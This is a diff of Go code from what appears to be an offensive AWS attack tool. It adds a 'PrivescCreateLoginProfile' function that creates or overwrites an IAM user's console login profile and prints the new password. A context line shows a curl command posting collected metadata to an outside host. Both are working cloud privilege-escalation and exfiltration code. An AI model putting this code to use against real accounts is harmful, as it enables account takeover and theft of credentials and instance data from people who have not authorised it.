@@ -55,3 +55,21 @@ curl -X POST -d "$META" %s
 		StartInstance(sess, instanceID)
 	}
 }
+
+func PrivescCreateLoginProfile(sess *session.Session, user string, t string) {
+	rando := SetTrackingAction(t, "loginprofile-privesc")
+	profile, password := CreateLoginProfile(sess, user)
+	if profile != nil {
+		fmt.Println("User: " + user)
+		fmt.Println("Password: " + password + "\n")
+		fmt.Println("UA Tracking: exec-env/" + rando)
+
+	} else {
+		fmt.Println("\nProfile exists, Updating instead..")
+		_, password := UpdateLoginProfile(sess, user)
+		fmt.Println("User: " + user)
+		fmt.Println("Password: " + password + "\n")
+		fmt.Println("UA Tracking: exec-env/" + rando)
+	}
+
+}
